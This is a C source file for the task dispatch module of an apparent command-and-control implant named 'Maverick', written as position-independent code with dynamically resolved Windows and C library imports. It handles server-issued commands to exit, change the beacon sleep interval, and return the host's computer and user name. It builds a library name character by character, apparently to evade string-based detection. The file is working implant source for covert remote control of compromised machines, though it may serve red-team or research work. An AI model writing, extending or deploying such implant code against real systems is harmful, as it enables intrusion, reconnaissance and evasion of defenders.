/*
 * Maverick — Task Dispatch Module (PICO)
 *
 * Handles command dispatch for the three supported commands:
 *   - EXIT  (0x10) — set exit flag, return exit method
 *   - SLEEP (0x20) — update sleep interval
 *   - WHOAMI (0x30) — return COMPUTER\username
 *
 * This runs as a separate PICO module. It receives a pointer to the agent state
 * (AgentState prefix of MvState) so it can modify sleep/exit flags.
 *
 * Task data format: [4B command_id LE][optional payload...]
 * go() signature matches TASK_FUNC in entry.c.
 */

#include <windows.h>

/* DFR declarations */
DECLSPEC_IMPORT void * __cdecl MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void * __cdecl MSVCRT$memset(void *, int, size_t);
DECLSPEC_IMPORT void * __cdecl MSVCRT$memcpy(void *, const void *, size_t);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char *);
DECLSPEC_IMPORT int    __cdecl MSVCRT$sprintf(char *, const char *, ...);

WINBASEAPI BOOL WINAPI KERNEL32$GetComputerNameA(LPSTR, LPDWORD);
WINBASEAPI BOOL WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);

/* Command IDs — must match config.h and server-side pl_commands.go */
#define COMMAND_EXIT    0x10
#define COMMAND_SLEEP   0x20
#define COMMAND_WHOAMI  0x30

/*
 * AgentState — prefix of MvState (entry.c). Fields must match the first N fields
 * exactly so the task module can read/write shared state via the pointer.
 */
typedef struct {
    char uuid[37];
    char agent_id[37];
    unsigned char session_key[16];
    int connected;
    int sleep_ms;
    int jitter;
    int exit_flag;
    int exit_method;
} AgentState;

static int handle_exit(AgentState *state, unsigned char *data, int len,
                       unsigned char **result, int *result_len) {
    state->exit_flag = 1;
    state->exit_method = 1;
    if (len >= 8)
        state->exit_method = *(int *)(data + 4);
    *result = (unsigned char *)MSVCRT$malloc(4);
    *(int *)(*result) = state->exit_method;
    *result_len = 4;
    return 1;
}

static int handle_sleep(AgentState *state, unsigned char *data, int len,
                        unsigned char **result, int *result_len) {
    if (len >= 8) {
        unsigned int new_sleep = *(unsigned int *)(data + 4);
        state->sleep_ms = (int)(new_sleep * 1000);
    }
    *result = (unsigned char *)MSVCRT$malloc(2);
    MSVCRT$memcpy(*result, "ok", 2);
    *result_len = 2;
    return 1;
}

static int handle_whoami(AgentState *state, unsigned char *data, int len,
                         unsigned char **result, int *result_len) {
    char advapi32_str[] = {'A','D','V','A','P','I','3','2',0};
    KERNEL32$LoadLibraryA(advapi32_str);

    char computer[256];
    MSVCRT$memset(computer, 0, sizeof(computer));
    DWORD comp_len = sizeof(computer);
    KERNEL32$GetComputerNameA(computer, &comp_len);

    char username[256];
    MSVCRT$memset(username, 0, sizeof(username));
    DWORD uname_len = sizeof(username);
    ADVAPI32$GetUserNameA(username, &uname_len);

    char output[520];
    MSVCRT$memset(output, 0, sizeof(output));
    MSVCRT$sprintf(output, "%s\\%s", computer, username);

    int out_len = (int)MSVCRT$strlen(output);
    *result = (unsigned char *)MSVCRT$malloc(out_len);
    MSVCRT$memcpy(*result, output, out_len);
    *result_len = out_len;
    return 1;
}

int go(AgentState *state, unsigned char *task_data, int data_len,
       unsigned char **result, int *result_len) {

    *result = NULL;
    *result_len = 0;

    if (!task_data || data_len < 1) return 0;

    unsigned int command_id = 0;
    if (data_len >= 4)
        command_id = *(unsigned int *)task_data;
    else
        command_id = task_data[0];

    int has_output = 0;
    switch (command_id) {
        case COMMAND_EXIT:   has_output = handle_exit(state, task_data, data_len, result, result_len); break;
        case COMMAND_SLEEP:  has_output = handle_sleep(state, task_data, data_len, result, result_len); break;
        case COMMAND_WHOAMI: has_output = handle_whoami(state, task_data, data_len, result, result_len); break;
        default: return 0;
    }

    return has_output ? (int)command_id : 0;
}
